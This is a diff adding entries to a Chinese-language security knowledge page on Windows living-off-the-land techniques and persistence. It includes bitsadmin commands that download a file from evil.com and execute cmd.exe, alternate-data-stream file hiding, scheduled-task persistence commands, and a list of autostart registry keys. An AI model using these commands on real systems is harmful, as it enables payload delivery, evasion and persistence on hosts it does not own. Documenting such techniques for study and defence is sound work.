@@ -21,7 +21,10 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
 常见程序
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - bitsadmin.exe
-    - 用于上传下载
+    - 下载文件 ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>``
+    - 下载文件 ``bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1``
+    - 复制文件 ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset``
+    - 代码执行 ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset``
 - cdb.exe
 - certutil.exe
     - 可安装、备份、删除、管理和执行证书
@@ -31,6 +34,7 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
 - csc.exe
 - cscript.exe
     - 执行脚本
+- Extexport.exe
 - expand.exe
     - 展开一个或多个压缩文件
 - mofcomp.exe
@@ -55,6 +59,10 @@ LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，�
     - 查看服务状态管理
 - schtasks.exe
     - 定时计划任务
+- shred
+    - 重复写入文件，防止文件恢复
+- type.exe
+    - 利用ads隐藏文件 ``type <filepath> <target_file:ads>``
 - wmic.exe
     - Windows管理工具
 - windbg.exe
@@ -79,6 +87,8 @@ sethc
 定时任务
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Windows下有 ``schtasks`` 和 ``at`` 两种计划任务机制。 其中 ``at`` 在较高版本的Windows中已经弃用。
+
+设置命令为 ``schtasks /create /tn "TEST_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"`` 、 ``schtasks /create /tn "TEST_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"`` 。删除命令为 ``schtasks /delete /tn "TEST_OnLogon" /f`` 。
 
 登录脚本
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -139,6 +149,35 @@ ByPass
 自启动
 ----------------------------------------
 通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 ``Run`` 和 ``RunOnce`` ，其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。
+
+注册表如下：
+
+- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run``
+- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce``
+- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run``
+- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce``
+- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx``
+
+基于策略的自启动注册表设置如下：
+
+- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run``
+- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run``
+
+设置启动文件夹注册表位置如下：
+
+- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders``
+- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders``
+- ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders``
+- ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders``
+
+设置服务启动项注册表位置如下：
+
+- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce``
+- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce``
+- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices``
+- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices``
+
+用户自启动位置 ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`` 、 ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`` 。
 
 权限提升
 ----------------------------------------
